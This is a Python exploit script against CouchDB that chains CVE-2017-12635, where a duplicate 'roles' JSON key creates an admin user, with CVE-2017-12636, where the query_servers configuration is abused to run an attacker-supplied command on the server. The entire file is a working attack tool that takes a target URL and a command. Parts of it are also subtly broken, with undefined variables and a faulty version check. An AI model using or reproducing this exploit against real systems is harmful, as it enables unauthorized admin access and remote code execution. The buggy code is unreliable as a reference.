import argparse
import requests
import sys
from log_colors import *
requests.packages.urllib3.disable_warnings()

class CVE2017_12636:
    headers = {"Content-Type": "application/json"}

    def __init__(self, url, user, pswd, cmd):
        print (LogColors.BLUE + "victim: " + url + "..." + LogColors.ENDC)
        self.url = url
        self.user, self.pswd = user, pswd
        self.cmd = cmd
        self.session = requests.Session()
        self.session.headers = self.headers

    # detect couchdb version
    def detect_version(self):
        print (LogColors.BLUE + "get couchdb version..." + LogColors.ENDC)
        v = self.session.get(self.url).json()["version"]
        vstr = v.replace(".", "")
        v1 = (v[0] == "1" and int(vstr) <= 170)
        v2 = (v[0] == "2" and int(vstr) < 211)
        if v1 or v2:
            print (LogColors.YELLOW + "couchdb version: " + str(v) + LogColors.ENDC)
            self.version = v
        else:
            print (LogColors.RED + "version: " + str(v) + " is not vulnerable. exit :(" + LogColors.ENDC) 
            sys.exit()

    # create new user with admin role
    def privesc(self):
        print (LogColors.BLUE + "exploitation (CVE-2017-12635)..." + LogColors.ENDC)
        payload = '{"type": "user", "name": "' + self.user + '",'
        payload += '"roles": ["_admin"], "roles": [],'
        payload += '"password": "' + self.pswd + '"}'

        r = self.session.put(
            self.url.rstrip("/") + "/_users//org.couchdb.user:" + self.user,
            data = payload
        )
        if r.ok:
            print (LogColors.YELLOW + self.user + ":" + self.pswd + LogColors.ENDC)
            print (LogColors.GREEN + "successfully create new user. hacked :)" + LogColors.ENDC)
            self.session.auth = requests.auth.HTTPBasicAuth(self.user, self.pswd)
        else:
            print (LogColors.RED + "create the user failed. :(" + LogColors.ENDC)
    
    # create payload with command
    def create_payload(self):
        self.detect_version()
        if self.version == "1":
            url = self.url.rstrip("/") + "/_config/query_servers/cmd"
            self.session.put(url, data = '"' + self.cmd + '"')
            if r.ok:
                print (LogColors.YELLOW + url + LogColors.ENDC)
                print (LogColors.GREEN + "successfully create payload :)" + LogColors.ENDC)
            else:
                print (LogColors.RED + "failed to create payload :(" + LogColors.ENDC)
                sys.exit()
        else:
            host = session.get(self.url.rstrip("/") + "/_membership").json()["all_nodes"][0]
            url = self.url.rstrip("/") + "/_node/" + host + "/_config/query_servers/cmd"
            self.session.put(url, data = '"' + self.cmd + '"')
            if r.ok:
                print (LogColors.YELLOW + url + LogColors.ENDC)
                print (LogColors.GREEN + "successfully create payload :)" + LogColors.ENDC)
            else:
                print (LogColors.RED + "failed to create payload :(" + LogColors.ENDC)
                sys.exit()

    def create_db(self):
        print (LogColors.BLUE + "create db..." + LogColors.ENDC)
        try:
            db = self.url.rstrip("/") + "/hacked"
            self.session.put(db)
            self.session.put(db + "/", data = '{"_id" : "cocomelonc"}')
            print (LogColors.YELLOW + str(db) + LogColors.ENDC)
            self.db = db
            print (LogColors.GREEN + "successfully create database :)" + LogColors.ENDC)
        except requests.exceptions.HTTPError:
            print (LogColors.RED + "failed to create db :(" + LogColors.ENDC)

    def exploit(self):
        print (LogColors.BLUE + "exploitation..." + LogColors.ENDC)
        self.create_payload()
        self.create_db()
        if self.version == '1':
            url = self.db + "/_temp_view?limit=10"
            r = self.session.post(url, data = '{"language": "cmd", "map": ""}')
        else:
            data = '{"_id": "_design/zero", "views": {"hacked": {"map": ""} }, "language": "cmd"}'
            url = self.db + "/_design/zero"
            r = self.session.post(url, data = data)
        if r.ok:
            print (LogColors.YELLOW + "command:" + str(self.cmd) + LogColors.ENDC)
            print (LogColors.YELLOW + r.text + LogColors.ENDC)
            print (LogColors.GREEN + "successful execute payload. hacked :)" + LogColors.ENDC)
        else:
            print (LogColors.RED + "failed to execute payload :(" + LogColors.ENDC)

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-t','--target', required = True, help = "target url")
    parser.add_argument('-u','--user', required = True, help = "username")
    parser.add_argument('-p','--password', required = True, help = "password")
    parser.add_argument('-c','--cmd', required = True, help = "command to run")
    args = vars(parser.parse_args())
    url = args['target']
    user, pswd = args['user'], args['password']
    cmd = args['cmd']
    cve = CVE2017_12636(url, user, pswd, cmd)
    cve.exploit()

